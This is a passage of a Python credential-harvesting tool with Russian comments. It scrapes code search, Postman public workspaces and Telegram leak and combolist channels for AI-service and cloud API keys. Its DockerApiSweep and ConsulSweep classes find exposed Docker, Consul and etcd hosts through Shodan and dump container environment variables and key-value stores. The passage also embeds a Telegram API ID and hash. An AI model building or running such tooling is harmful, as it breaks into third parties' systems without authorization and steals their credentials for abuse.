                    % (urlquote(q), api_key),
                    timeout=(10, 20),
                )
                if r is None or r.status_code != 200:
                    continue
                for item in (r.json().get("items") or [])[:5]:
                    sn = item.get("snippet") or {}
                    vid_real = (item.get("id") or {}).get("videoId") or "?"
                    desc = str(sn.get("description") or "")
                    if desc.strip():
                        out.append((desc, "youtube:%s" % vid_real))
                    vid = (item.get("id") or {}).get("videoId")
                    if not vid:
                        continue
                    try:
                        rc = http(
                            "GET",
                            "https://www.googleapis.com/youtube/v3/commentThreads"
                            "?videoId=%s&maxResults=30&part=snippet&order=relevance&key=%s"
                            % (vid, api_key),
                            timeout=(10, 20),
                        )
                        if rc is None or rc.status_code != 200:
                            continue
                        for ct in (rc.json().get("items") or [])[:30]:
                            _cs = (
                                (ct.get("snippet") or {}).get("topLevelComment") or {}
                            ).get("snippet") or {}
                            txt = str(_cs.get("textDisplay") or "")
                            if txt.strip():
                                out.append((txt, "youtube-comment:%s" % vid))
                    except Exception:
                        continue
            except Exception:
                continue
        return out


class SourcegraphSearch(Source):
    """Sourcegraph.com: глобальный публичный код-поиск (SSE-стрим, без ключа).
    Индексирует зеркала GitHub/GitLab — находит то, что GitHub code search
    не отдаёт (форки, мёртвые репо, старые ревизии).
    NOTE: с датацентровых IP ломится Cloudflare Turnstile (cloudscraper не
    проходит) — гейт 30 мин, чтобы не жечь бюджет цикла."""

    name = "sourcegraph-search"  # было "sourcegraph" — ДУБЛЬ имени с классом
    # Sourcegraph выше; run_sources дедупал по имени и один источник молча
    # отваливался из ротации
    STATE_PATH = os.path.join(HERE, "sourcegraph_state.json")
    QUERIES = (
        '"sk-ant-api03"',
        '"sk-ant-oat01"',
        '"sk-proj-" file:.env count:20',
        '"sk-or-v1-" file:.env count:20',
        '"gsk_" file:.env count:20',
        '"LITELLM_MASTER_KEY"',
    )

    def fetch(self):
        out = []
        # гейт 30 мин: CF-блок не должен жечь бюджет SOURCES каждый цикл
        st = {}
        try:
            st = json.load(open(self.STATE_PATH, encoding="utf-8"))
        except Exception:
            pass
        if time.time() - float(st.get("ts") or 0) < 1800:
            return out
        try:
            json.dump(
                {"ts": time.time()},
                open(self.STATE_PATH, "w", encoding="utf-8"),
            )
        except Exception:
            pass
        for q in self.QUERIES:
            url = "https://sourcegraph.com/.api/search/stream?q=%s&count=20" % urlquote(
                "context:global %s" % q
            )
            r = None
            try:
                r = http(
                    "GET",
                    url,
                    timeout=(10, 25),
                    headers={"Accept": "text/event-stream"},
                )
            except Exception:
                r = None
            # sourcegraph за Cloudflare: plain requests ловит challenge —
            # cloudscraper проходит (тот же механизм, что и для claude.ai)
            if (
                r is None
                or r.status_code in (403, 503)
                or "Just a moment" in ((r.text or "")[:300])
            ):
                try:
                    r = cloud_get(url, timeout=(15, 30))
                except Exception:
                    continue
            if r is None or r.status_code != 200:
                continue
            for line in (r.text or "").splitlines():
                if not line.startswith("data: ") or "repository" not in line:
                    continue
                try:
                    arr = json.loads(line[6:])
                except Exception:
                    continue
                for mch in (arr if isinstance(arr, list) else [])[:20]:
                    body = "\n".join(
                        str(cm.get("text") or "")
                        for cm in (mch.get("chunkMatches") or [])
                    )
                    if body.strip():
                        out.append(
                            (
                                body,
                                "sourcegraph:%s/%s"
                                % (
                                    mch.get("repository") or "?",
                                    mch.get("path") or "?",
                                ),
                            )
                        )
        return out


# ------------------------------------------------------------------ P2 WAVE
class BitbucketSnippets(Source):
    """Bitbucket public snippets API 2.0 с пагинацией (в feeds — только первая
    страница; выделенный класс даёт глубину: 3 страницы + файлы сниппетов)."""

    name = "bitbucket"

    def fetch(self):
        out = []
        url = "https://api.bitbucket.org/2.0/snippets?role=public&pagelen=30"
        for _ in range(3):
            if not url:
                break
            try:
                r = http("GET", url, timeout=(10, 20))
                if r.status_code in (401, 403):
                    return out  # анонимный листинг закрыт — тихо уходим
                if r.status_code != 200:
                    break
                j = r.json()
                for v in (j.get("values") or [])[:30]:
                    for fn, fo in (v.get("files") or {}).items():
                        href = ((fo.get("links") or {}).get("self") or {}).get("href")
                        if not href:
                            continue
                        try:
                            t, code = fetch_text(href, (6, 12), 200_000)
                            if t and code == 200:
                                out.append(
                                    (t, "bitbucket:%s/%s" % (v.get("id", "?"), fn))
                                )
                        except Exception:
                            continue
                url = j.get("next")
            except Exception:
                break
        return out


class GreyNoiseEnrich(Source):
    """GreyNoise Community: enrichment IP из cc_sweep_known (сканер/хостер
    контекст). Ключ: greynoise_key (community-тир, бесплатный). Нет — skip."""

    name = "greynoise"

    def fetch(self):
        key = CFG.get("greynoise_key")
        if not key:
            return []
        ips = []
        try:
            known = json.load(
                open(os.path.join(HERE, "cc_sweep_known.json"), encoding="utf-8")
            )
            ips = [str(h).rsplit(":", 1)[0] for h in known.keys()]
        except Exception:
            return []
        # дневной бюджет community-тира (~50/сутки): считаем в файле,
        # 429 — стоп до завтра (было: жгли все 30 запросов в первые циклы,
        # остаток дня — гарантированные ошибки)
        _gn_path = os.path.join(HERE, "greynoise_daily.json")
        try:
            _gn = json.load(open(_gn_path, encoding="utf-8"))
        except Exception:
            _gn = {}
        _day = time.strftime("%Y-%m-%d")
        if _gn.get("day") != _day:
            _gn = {"day": _day, "n": 0}
        if _gn.get("n", 0) >= 50:
            return []
        out = []
        for ip in ips[:30]:
            if _gn["n"] >= 50:
                break
            try:
                r = http(
                    "GET",
                    "https://api.greynoise.io/v3/community/" + ip,
                    timeout=(8, 15),
                    headers={"key": key, "Accept": "application/json"},
                )
                if r.status_code == 429:
                    _gn["n"] = 50  # дневной кап исчерпан
                    break
                if r.status_code == 200 and r.text.strip():
                    _gn["n"] += 1
                    out.append((r.text, "greynoise:%s" % ip))
            except Exception:
                continue
        try:
            _atomic_json_dump(_gn_path, _gn)
        except Exception:
            pass
        return out


class InternetDB(Source):
    """internetdb.shodan.io (без ключа): открытые порты relay-IP из
    cc_sweep_known/censys/netlas -> новые эндпоинты для cc_proxy_sweep
    (пишем в internetdb_endpoints.json, cc-sweep их подхватывает)."""

    name = "internetdb"
    EP_PATH = os.path.join(HERE, "internetdb_endpoints.json")

    def fetch(self):
        ips = []
        try:
            known = json.load(
                open(os.path.join(HERE, "cc_sweep_known.json"), encoding="utf-8")
            )
            ips += [str(h).rsplit(":", 1)[0] for h in known.keys()]
        except Exception:
            pass
        for epf in ("censys_endpoints.json", "netlas_endpoints.json"):
            try:
                d = json.load(open(os.path.join(HERE, epf), encoding="utf-8"))
                ips += [str(h).rsplit(":", 1)[0] for h in list(d.keys())[:40]]
            except Exception:
                pass
        ips = list(
            dict.fromkeys(i for i in ips if re.match(r"^\d+\.\d+\.\d+\.\d+$", i or ""))
        )
        if not ips:
            return []
        # ротация: 30 IP за цикл
        idx = int(time.time() // 600)
        start = (idx * 30) % len(ips)
        batch = [ips[(start + j) % len(ips)] for j in range(min(30, len(ips)))]
        endpoints = {}
        try:
            endpoints = json.load(open(self.EP_PATH, encoding="utf-8"))
        except Exception:
            pass
        out = []
        new_eps = [0]

        def lookup(ip):
            try:
                r = requests.get(
                    "https://internetdb.shodan.io/" + ip,
                    timeout=(6, 10),
                    verify=False,
                )
                if r.status_code != 200:
                    return None
                return r.json()
            except Exception:
                return None

        def note(ip, j):
            if not j:
                return
            for port in j.get("ports") or []:
                addr = "%s:%s" % (ip, port)
                if addr not in endpoints:
                    endpoints[addr] = {"ts": time.time(), "src": "internetdb"}
                    new_eps[0] += 1
            txt = json.dumps(j, ensure_ascii=False)
            # word-boundary: голое "api" матчил "capistrano"/"rapid" (шум)
            if re.search(
                r"(?i)(proxy|(?<![a-z])api(?![a-z])|llm|one-api|new-api)", txt
            ):
                out.append((txt, "internetdb:%s" % ip))

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            for ip, j in zip(batch, ex.map(lookup, batch)):
                note(ip, j)
        if new_eps[0]:
            try:
                json.dump(
                    endpoints,
                    open(self.EP_PATH, "w", encoding="utf-8"),
                    indent=1,
                    ensure_ascii=False,
                )
                log("  [internetdb] +%d новых эндпоинтов для cc-sweep" % new_eps[0])
            except Exception:
                pass
        return out


class Quake360(Source):
    """Quake (360.cn) — китайский краулер, покрытие CN-инфры, которого нет в
    Shodan. Ключ: quake_key в конфиге; нет ключа — молча skip."""

    name = "quake360"
    QUERIES = (
        '"sk-ant-oat01"',
        '"setup_token"',
        '"sk-proj-"',
        '"new-api"',
        '"OPENAI_API_KEY"',
    )

    def fetch(self):
        key = CFG.get("quake_key")
        if not key:
            return []
        out = []
        for q in self.QUERIES:
            try:
                r = http(
                    "POST",
                    "https://quake.360.cn/api/v3/search/quake_service",
                    timeout=(12, 25),
                    headers={"X-QuakeToken": key},
                    json_body={"query": q, "start": 0, "size": 20},
                )
                if r.status_code != 200:
                    continue
                for d in (r.json().get("data") or [])[:20]:
                    body = str(
                        ((d.get("service") or {}).get("http") or {}).get("body") or ""
                    )
                    if body.strip():
                        out.append((body, "quake:%s:%s" % (d.get("ip"), d.get("port"))))
            except Exception:
                continue
        return out


class HunterQianxin(Source):
    """Hunter (Qianxin) — китайский краулер. Ключ: hunter_key; нет — молча
    skip. search = base64url от синтаксиса web.body="..."."""

    name = "hunter"
    QUERIES = (
        'web.body="sk-ant-oat01"',
        'web.body="setup_token"',
        'web.body="sk-proj-"',
        'web.body="new-api"',
    )

    def fetch(self):
        key = CFG.get("hunter_key")
        if not key:
            return []
        import base64 as _b64

        out = []
        for q in self.QUERIES:
            try:
                qb = _b64.urlsafe_b64encode(q.encode()).decode()
                r = http(
                    "GET",
                    "https://hunter.qianxin.com/openApi/search"
                    "?api-key=%s&search=%s&page=1&page_size=20&is_web=3" % (key, qb),
                    timeout=(12, 25),
                )
                if r.status_code != 200:
                    continue
                for d in ((r.json().get("data") or {}).get("arr") or [])[:20]:
                    body = (
                        str(d.get("banner") or "")
                        + "\n"
                        + str(d.get("web_title") or "")
                    )
                    if body.strip():
                        out.append(
                            (body, "hunter:%s:%s" % (d.get("ip"), d.get("port")))
                        )
            except Exception:
                continue
        return out


class DockerApiSweep(Source):
    """🐋 ОТКРЫТЫЙ DOCKER API (port 2375 без TLS-auth) — ЗОЛОТАЯ ЖИЛА:
    /containers/json -> inspect -> Config.Env содержит РАНТАЙМ-креды
    контейнеров: LITELLM_MASTER_KEY, OPENAI_API_KEY, DATABASE_URL...
    Люди крутят litellm/new-api в докере с ключами в env — забираем всё.
    Отдельно от shodan-баннерных запросов: тут гоняем по ВСЕМ 2375-хостам."""

    name = "docker-api"
    _SEEN_PATH = property(lambda self: os.path.join(HERE, "docker_api_seen.json"))

    def fetch(self):
        keys = Shodan()._alive_pool(Shodan()._key_pool())
        if not keys:
            return []
        try:
            seen = json.load(open(self._SEEN_PATH, encoding="utf-8"))
        except Exception:
            seen = {}
        now = time.time()
        # TTL: трупы/пустые 3д, успешные 7д
        seen = {
            k: v
            for k, v in seen.items()
            if now - (v.get("ts") or 0) < (7 * 86400 if v.get("hit") else 3 * 86400)
        }
        cyc = int(now // 600)
        page = (cyc % 20) + 1  # ~7k хостов на 2375 — гоняем страницы по кругу
        matches = []
        for sk in keys:
            try:
                r = requests.get(
                    "https://api.shodan.io/shodan/host/search",
                    params={"key": sk, "query": "port:2375", "page": page},
                    timeout=(10, 25),
                    verify=False,
                )
                if r.status_code == 429:
                    time.sleep(3)
                    continue
                if r.status_code != 200:
                    break
                matches = r.json().get("matches") or []
                break
            except Exception:
                break
        if not matches:
            return []
        out = []

        def probe(ip):
            if ip in seen:
                return []
            base = "http://%s:2375" % ip
            chunks = []
            try:
                r = requests.get(
                    base + "/containers/json?all=1", timeout=(3, 6), verify=False
                )
                if r.status_code != 200:
                    seen[ip] = {"ts": now, "hit": False}
                    return []
                conts = r.json() or []
                hit = False
                for c in conts[:8]:
                    cid = c.get("Id")
                    if not cid:
                        continue
                    try:
                        ri = requests.get(
                            "%s/containers/%s/json" % (base, cid),
                            timeout=(3, 6),
                            verify=False,
                        )
                        if ri.status_code != 200:
                            continue
                        j = ri.json()
                        env = ((j.get("Config") or {}).get("Env")) or []
                        if env:
                            txt = "\n".join(str(e) for e in env)
                            chunks.append(
                                (txt, "docker-api:%s:%s" % (ip, c.get("Image", "?")))
                            )
                            hit = True
                    except Exception:
                        continue
                seen[ip] = {"ts": now, "hit": hit}
            except Exception:
                seen[ip] = {"ts": now, "hit": False}
                return []
            return chunks

        ips = []
        for m in matches[:25]:
            ip = m.get("ip_str")
            if ip and ip not in seen:
                ips.append(ip)
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            for chunks in ex.map(probe, ips):
                out.extend(chunks)
        try:
            _atomic_json_dump(self._SEEN_PATH, seen)
        except Exception:
            pass
        if out:
            log("  🐋 docker-api: %d env-дампов с открытых хостов" % len(out))
        return out


class ConsulSweep(Source):
    """🏛️ Открытый Consul KV (port 8500 без ACL): /v1/kv/?recurse отдаёт ВСЕ
    ключи-значения кластера — конфиги с токенами/паролями в plain/base64.
    Плюс etcd (2379 /v2/keys?recursive=true) той же механикой."""

    name = "consul-kv"
    _SEEN_PATH = property(lambda self: os.path.join(HERE, "consul_seen.json"))

    def fetch(self):
        keys = Shodan()._alive_pool(Shodan()._key_pool())
        if not keys:
            return []
        try:
            seen = json.load(open(self._SEEN_PATH, encoding="utf-8"))
        except Exception:
            seen = {}
        now = time.time()
        seen = {k: v for k, v in seen.items() if now - (v.get("ts") or 0) < 3 * 86400}
        cyc = int(now // 600)
        # consul 8500 и etcd 2379 ротацией (чередуем по циклам)
        q, port, kind = (
            ('port:8500 "consul"', 8500, "consul")
            if cyc % 2 == 0
            else ('port:2379 "etcd"', 2379, "etcd")
        )
        page = ((cyc // 2) % 10) + 1
        matches = []
        for sk in keys:
            try:
                r = requests.get(
                    "https://api.shodan.io/shodan/host/search",
                    params={"key": sk, "query": q, "page": page},
                    timeout=(10, 25),
                    verify=False,
                )
                if r.status_code == 429:
                    time.sleep(3)
                    continue
                if r.status_code != 200:
                    break
                matches = r.json().get("matches") or []
                break
            except Exception:
                break
        if not matches:
            return []
        out = []

        def probe(ip):
            hid = "%s:%s" % (ip, port)
            if hid in seen:
                return []
            base = "http://%s:%s" % (ip, port)
            try:
                if kind == "consul":
                    r = requests.get(
                        base + "/v1/kv/?recurse=true", timeout=(3, 8), verify=False
                    )
                    if r.status_code != 200 or not r.text.startswith("["):
                        seen[hid] = {"ts": now}
                        return []
                    import base64 as _b

                    vals = []
                    for ent in (r.json() or [])[:400]:
                        v = ent.get("Value")
                        if not v:
                            continue
                        try:
                            vals.append(
                                "%s=%s"
                                % (
                                    ent.get("Key", "?"),
                                    _b.b64decode(v).decode("utf-8", "replace"),
                                )
                            )
                        except Exception:
                            continue
                    seen[hid] = {"ts": now}
                    if vals:
                        log("  🏛️ CONSUL KV %s — %d ключей!" % (hid, len(vals)))
                        return [("\n".join(vals), "consul:%s" % hid)]
                    return []
                else:  # etcd v2 API
                    r = requests.get(
                        base + "/v2/keys?recursive=true", timeout=(3, 8), verify=False
                    )
                    if r.status_code != 200:
                        seen[hid] = {"ts": now}
                        return []
                    seen[hid] = {"ts": now}
                    if '"value"' in r.text:
                        log("  🏛️ ETCD KV %s — есть ключи!" % hid)
                        return [(r.text[:300_000], "etcd:%s" % hid)]
                    return []
            except Exception:
                seen[hid] = {"ts": now}
                return []

        ips = []
        for m in matches[:20]:
            ip = m.get("ip_str")
            if ip and ("%s:%s" % (ip, port)) not in seen:
                ips.append(ip)
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
            for chunks in ex.map(probe, ips):
                out.extend(chunks)
        try:
            _atomic_json_dump(self._SEEN_PATH, seen)
        except Exception:
            pass
        return out


class TGGlobalHunt(Source):
    """🌐 TG ГЛОБАЛЬНЫЙ ПОИСК через живую nyx_session (Telethon): свежие дампы
    combolist-каналов — oat01/sid01/куки/ключи появляются там РАНЬШЕ github.
    2 запроса за прогон, гейт 30 мин (жёсткий флуд-лимит у global search).
    Сессия — ОТДЕЛЬНАЯ КОПИЯ файла (не делим SQLite с fresh_scan)."""

    name = "tg-global"
    SRC_SESSION = r"C:\OpenCodeWorkspace\tg\nyx_session.session"
    KH_SESSION = r"C:\OpenCodeWorkspace\tg\nyx_session_kh"  # без .session суффикса
    STATE_PATH = os.path.join(HERE, "tg_global_hunt.json")
    API_ID = 35094427
    API_HASH = "72251a8100fad5f4322a38b8161cff84"
    GATE = 1800  # 30 минут между прогонами
    QUERIES = (
        "sk-proj-",
        "OPENAI_API_KEY",
        "sk-ant-oat01",
        "sk-ant-sid01",
        ".credentials.json claude",
        "setup_token claude",
        "cookies.txt netscape",
        "LITELLM_MASTER_KEY",
        "glpat-",
        "dashscope sk-",
    )
    # имя канала содержит -> ключевой (фаза диалогов: приватки типа ZK,
    # которых НЕТ в глобальном индексе)
    CHAT_NAME_RE = re.compile(
        r"(?i)(key|keys|ключ|combol|combo|private|api|proxy|llm|gpt|claude|"
        r"token|free|халяв|dump|leak|слив|neural|subs|подпис|openai|anthropic|"
        r"cursor|copilot|\bzk\b|взлом|аккаунт|account|shop|market|otp|"
        r"cookie|куки|сессион|session|keys_hunt|hunt)"
    )

    def fetch(self):
        import asyncio
        import shutil

        try:
            st = json.load(open(self.STATE_PATH, encoding="utf-8"))
        except Exception:
            st = {}
        now = time.time()
        if now - float(st.get("ts") or 0) < self.GATE:
            return []
        # копия сессии для keyhunter (разово)
        if not os.path.exists(self.KH_SESSION + ".session"):
            try:
                shutil.copy2(self.SRC_SESSION, self.KH_SESSION + ".session")
            except Exception as e:
                log("  [tg-global] нет сессии: %s" % e)
                return []
        rot = int(st.get("rot") or 0)
        chat_rot = [int(st.get("chat_rot") or 0)]  # mutable для _run
        qs = [
            self.QUERIES[rot % len(self.QUERIES)],
            self.QUERIES[(rot + 1) % len(self.QUERIES)],
        ]
        seen_ids = set(st.get("seen") or [])
        out = []

        async def _run():
            from telethon import TelegramClient
            from telethon.tl.functions.messages import SearchGlobalRequest
            from telethon.tl.types import InputMessagesFilterEmpty, InputPeerEmpty
            from telethon.errors import FloodWaitError

            client = TelegramClient(
                self.KH_SESSION,
                self.API_ID,
                self.API_HASH,
                proxy=("socks5", "127.0.0.1", 10808),
                connection_retries=1,
            )
            await client.connect()
            try:
                if not await client.is_user_authorized():
                    log("  [tg-global] сессия не авторизована")
                    return
                for q in qs:
                    try:
                        res = await client(
                            SearchGlobalRequest(
                                q=q,
                                filter=InputMessagesFilterEmpty(),
                                min_date=None,
                                max_date=None,
                                offset_rate=0,
                                offset_peer=InputPeerEmpty(),
                                offset_id=0,
                                limit=25,
                            )
                        )
                    except FloodWaitError as fw:
                        log(
                            "  [tg-global] flood-wait %ds — стоп до следующего окна"
                            % fw.seconds
                        )
                        break
                    n_new = 0
                    for m in getattr(res, "messages", []) or []:
                        mid = getattr(m, "id", None)
                        if mid is None:
                            continue
                        # АУДИТ-фикс: msg id УНИКАЛЕН ТОЛЬКО В РАМКАХ ЧАТА —
                        # голый mid в глобальном seen скипал НОВЫЕ сообщения
                        # других каналов с тем же порядковым номером
                        _peer = getattr(m, "peer_id", None)
                        _cid = (
                            getattr(_peer, "channel_id", None)
                            or getattr(_peer, "chat_id", None)
                            or getattr(_peer, "user_id", None)
                            or "g"
                        )
                        sid = "%s:%s" % (_cid, mid)
                        if sid in seen_ids:
                            continue
                        seen_ids.add(sid)
                        n_new += 1
                        txt = getattr(m, "message", "") or ""
                        # документы/код: Telethon отдаёт текст в message; если
                        # есть file — имя файла тоже интересно
                        doc = getattr(m, "file", None)
                        if doc is not None and getattr(doc, "name", None):
                            txt += "\nFILE: " + str(doc.name)
                        if txt.strip():
                            out.append((txt, "tg-global:%s" % q[:24]))
                    if n_new:
                        log("  [tg-global] %r: %d новых сообщений" % (q, n_new))
                    await asyncio.sleep(4)  # щадим флуд-лимит

                # ---- фаза 2: ДИАЛОГИ (приватные каналы — ZK и ко, их нет в
                # глобальном индексе). 10 ключевых каналов за прогон, ротация.
                try:
                    dialogs = await client.get_dialogs(limit=250)
                    key_chats = []
                    for d in dialogs:
                        title = getattr(d, "title", "") or getattr(d, "name", "") or ""
                        if self.CHAT_NAME_RE.search(title):
                            key_chats.append(d)
                except FloodWaitError as fw:
                    log("  [tg-global] dialogs flood-wait %ds" % fw.seconds)
                    key_chats = []
                except Exception:
                    key_chats = []
                if key_chats:
                    batch = [
                        key_chats[(chat_rot[0] + i) % len(key_chats)]
                        for i in range(min(10, len(key_chats)))
                    ]
                    log(
                        "  [tg-global] ключевых каналов: %d, батч %d"
                        % (len(key_chats), len(batch))
                    )
                    for d in batch:
                        title = getattr(d, "title", "") or getattr(d, "name", "") or "?"
                        try:
                            n_new = 0
                            async for m in client.iter_messages(d, limit=50):
                                mid = getattr(m, "id", None)
                                if mid is None:
                                    continue
                                # тот же аудит-фикс: (чат, msg), не голый id
                                _cid = (
                                    getattr(d, "id", None)
                                    or getattr(getattr(d, "entity", None), "id", None)
                                    or "?"
                                )
                                sid = "%s:%s" % (_cid, mid)
                                if sid in seen_ids:
                                    continue
                                seen_ids.add(sid)
                                txt = getattr(m, "message", "") or ""
                                doc = getattr(m, "file", None)
                                if doc is not None and getattr(doc, "name", None):
                                    txt += "\nFILE: " + str(doc.name)
                                if len(txt) > 25:
                                    out.append((txt, "tg-chat:%s" % title[:32]))
                                    n_new += 1
                            if n_new:
                                log("    [%s] +%d сообщений" % (title[:40], n_new))
                            await asyncio.sleep(3)
                        except FloodWaitError as fw:
                            log("    flood-wait %ds — стоп батч" % fw.seconds)
                            break
                        except Exception:
                            continue
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass

        _ok = True
        try:
            asyncio.run(_run())
        except Exception as e:
            _ok = False
            log("  [tg-global] err: %s" % e)
        # state: seen-хвост до 3000, rot++, ts.
        # АУДИТ-фикс: ts/rot продвигаем ТОЛЬКО при успехе — иначе один
        # сбой (сессия/сеть) сжигал 30-мин окно вхолостую. + атомарная запись.
        try:
            _st = {"seen": list(seen_ids)[-3000:]}
            if _ok:
                _st.update({"ts": now, "rot": rot + 2, "chat_rot": chat_rot[0] + 10})
            else:
                _st.update(
                    {
                        "ts": float(st.get("ts") or 0),
                        "rot": rot,
                        "chat_rot": chat_rot[0],
                    }
                )
            _tmp = self.STATE_PATH + ".tmp"
            with open(_tmp, "w", encoding="utf-8") as _f:
                json.dump(_st, _f)
            os.replace(_tmp, self.STATE_PATH)
        except Exception:
            pass
        return out


class PostmanHunt(Source):
    """📮 POSTMAN PUBLIC NETWORK (Claude-OSINT §24) — НЕаутентифицированный
    поиск по ВСЕМ публичным workspace/collection/environment Postman.
    Разрабы хранят прод-ключи в collection variables и environments —
    легендарная жила (postman-leaks). Прокси: POST /_api/ws/proxy
    {service:search, path:/search-all}. Дальше — детальный обход ID'шек:
    /_api/workspace/{id} (collections+environments), /_api/collection/{id}
    (полные запросы: auth-заголовки, скрипты), /_api/environment/{id}
    (значения переменных = КЛЮЧИ)."""

    name = "postman"

    QUERIES = (
        "sk-ant-",
        "sk-proj-",
        "OPENAI_API_KEY",
        "ANTHROPIC_API_KEY",
        "claude api key",
        "openai api key",
        "moonshot",
        "bigmodel",
        "glm api key",
        "deepseek api key",
        "openrouter",
        "AWS_SECRET_ACCESS_KEY",
        "supabase service_role",
        "stripe sk_live",
        "mongodb+srv",
        "postgres://",
        "OPENAI_API_BASE",
        "bearer token api",
        "api_key secret",
        "doppler",
    )
    PER_CYCLE = 4
    _PROXY = "https://www.postman.com/_api/ws/proxy"
    _STATE = os.path.join(HERE, "postman_state.json")

    def fetch(self):
        out = []
        try:
            st = json.load(open(self._STATE, encoding="utf-8"))
        except Exception:
            st = {}
        seen_ids = set(st.get("seen") or [])
        rot = int(time.time() // 900)
        qs = [
            self.QUERIES[(rot + i) % len(self.QUERIES)] for i in range(self.PER_CYCLE)
        ]
        sess = requests.Session()
        sess.trust_env = False
        sess.headers.update(
            {"Content-Type": "application/json", "X-Entity-Team-Id": "0"}
        )
        ws_ids, coll_ids, env_ids = [], [], []

        def _collect_ids(obj):
            """Рекурсивный сбор id по типовым полям постмана."""
            if isinstance(obj, dict):
                for k, v in obj.items():
                    lk = k.lower()
                    if lk == "id" and isinstance(v, str) and len(v) > 8:
                        # id без типа — определим по соседям позже; собираем
                        # только если рядом типизированный контекст
                        pass
                    if lk in ("workspaceid", "workspace_id") and isinstance(v, str):
                        ws_ids.append(v)
                    elif lk in (
                        "collectionid",
                        "collection_id",
                        "collectionuid",
                    ) and isinstance(v, str):
                        coll_ids.append(v)
                    elif lk in (
                        "environmentid",
                        "environment_id",
                        "environmentuid",
                    ) and isinstance(v, str):
                        env_ids.append(v)
                    elif isinstance(v, (dict, list)):
                        _collect_ids(v)
                    # сырое тело хитов — сразу в пайплайн (там бывают сниппеты)
                # текстовые поля хита: name/description/summary — тащим как чанк
                try:
                    blob = json.dumps(obj, ensure_ascii=False)
                    if any(
                        m in blob
                        for m in (
                            "sk-",
                            "AKIA",
                            "api_key",
                            "API_KEY",
                            "Bearer ",
                            "secret",
                            "token",
                            "AIza",
                        )
                    ):
                        out.append((blob[:30000], "postman:search"))
                except Exception:
                    pass
            elif isinstance(obj, list):
                for x in obj:
                    _collect_ids(x)

        for q in qs:
            try:
                r = sess.post(
                    self._PROXY,
                    json={
                        "service": "search",
                        "method": "POST",
                        "path": "/search-all",
                        "body": {
                            "queryIndices": [
                                "collaboration.workspace",
                                "runtime.collection",
                                "runtime.request",
                            ],
                            "queryText": q,
                            "size": 100,
                            "from": 0,
                            "clientTraceId": "",
                            "queryAllIndices": False,
                            "domain": "public",
                        },
                    },
                    timeout=(12, 25),
                    verify=False,
                )
                if r.status_code != 200:
                    continue
                data = r.json().get("data") or []
                log("  [postman] %r: %d хитов" % (q, len(data)))
                for item in data:
                    _collect_ids(item)
            except Exception:
                continue
            time.sleep(1.2)

        # детальный обход: workspace -> коллекции/энвы; коллекции/энвы напрямую
        def _fetch_json(path):
            try:
                r = sess.get(
                    "https://www.postman.com/_api/" + path,
                    timeout=(10, 20),
                    verify=False,
                )
                if r.status_code == 200:
                    return r.json()
            except Exception:
                pass
            return None

        detail_budget = 30
        for wid in list(dict.fromkeys(ws_ids))[:10]:
            if detail_budget <= 0:
                break
            if wid in seen_ids:
                continue
            seen_ids.add(wid)
            wj = _fetch_json("workspace/%s" % wid)
            detail_budget -= 1
            if not wj:
                continue
            # коллекции и энвы воркспейса
            for coll_path in ("collection", "environment"):
                lst = _fetch_json("workspace/%s/%s" % (wid, coll_path))
                detail_budget -= 1
                if isinstance(lst, list):
                    for it in lst[:6]:
                        cid = it.get("id") if isinstance(it, dict) else None
                        if not cid or cid in seen_ids:
                            continue
                        seen_ids.add(cid)
                        (coll_ids if coll_path == "collection" else env_ids).append(cid)
                if detail_budget <= 0:
                    break

        for cid in list(dict.fromkeys(coll_ids))[: max(0, min(12, detail_budget))]:
            cj = _fetch_json("collection/%s" % cid)
            detail_budget -= 1
            if cj:
                out.append(
                    (json.dumps(cj, ensure_ascii=False)[:120000], "postman:collection")
                )
        for eid in list(dict.fromkeys(env_ids))[: max(0, min(8, detail_budget))]:
            ej = _fetch_json("environment/%s" % eid)
            detail_budget -= 1
            if ej:
                out.append(
                    (json.dumps(ej, ensure_ascii=False)[:60000], "postman:environment")
                )

        try:
            st["seen"] = list(seen_ids)[-4000:]
            _atomic_json_dump(self._STATE, st)
        except Exception:
            pass
        return out


ALL_SOURCE_CLASSES = [
    Gists,
    Lobsters,
    GistSearch,
    GrepApp,
    GitHubCode,
    GitHubCommits,
    GitHubEvents,
    GitHubIssues,
    Gitee,
    GitLab,
    Codeberg,
    Sourcegraph,
    TGSearch,
    HfSpaces,
    Pastebin,
    PasteMegaScan,
    DockerHub,
    PyPITarballs,
    StackOverflow,
    SearchDDG,
    SearxNG,
    LinuxDo,
    V2ex,
    HNAlgolia,
    FourChan,
    PullPush,
    NpmRegistry,
    WaybackHunt,
    URLScan,
    Kaggle,
    Censys,
    Netlas,
    LeakIX,
    VirusTotal,
    Shodan,
    Fofa,
    BasetenHunter,
    AnonFtp,
    HFSearch,
    ZoomEye,
    CriminalIP,
    OpenInfraSweep,
    Searchcode,
    PublicWWW,
    Lemmy,
    CrtSh,
    RapidDNS,
    HFDatasets,
    # BlueskySearch, RedditSearch: оба блокируют датацентровые IP наглухо (403
    # даже через DIRECT) — код оставлен, включить при появлении резидент-прокси
    ArquivoPT,
    GHActionsLogs,
    NewApiSweep,
    RelayScanner,
    Feeds,
    # P2-волна: bitbucket-глубина, IP-enrichment, CN-краулеры
    # BitbucketSnippets: ВЫКЛ (аудит 2026-09-10) — API 2.0 snippets?role=public
    # требует auth, role=public невалиден -> 401 навсегда, источник мёртв
    GreyNoiseEnrich,
    InternetDB,
    Quake360,
    HunterQianxin,
    # Unconventional wave: self-feeding YouTube, глобальный код-поиск
    YouTubeHunt,
    SourcegraphSearch,
    # 🐋🏛️ инфра-свипы: открытые docker API (env контейнеров) + consul/etcd KV
    DockerApiSweep,
    ConsulSweep,
    # 🌐 TG глобальный поиск (живая nyx_session, combolist-каналы)
    TGGlobalHunt,
    # АУДИТ-фикс 2026-09-10: класс был полностью написан (фингерпринтинг +
    # автопроверка бордов), но НИГДЕ не инстанцировался — источник не работал
    RelayBoards,
    # 📮 Postman public network: публичные коллекции/энвы с прод-ключами
    PostmanHunt,
]


# ------------------------------------------------------------------ DEDUP
def load_seen():
    try:
        # utf-8-sig: файл мог быть перезаписан PowerShell (Set-Content пишет
        # BOM) — голый utf-8 падает на BOM и seen молча становился ПУСТЫМ
        # (дедуп ломался, found.jsonl набивал дубли каждый цикл)
        return set(json.load(open(SEEN_PATH, encoding="utf-8-sig")))
    except Exception:
        # коррупция seen НЕ должна обнулять дедуп (было: молча set() ->
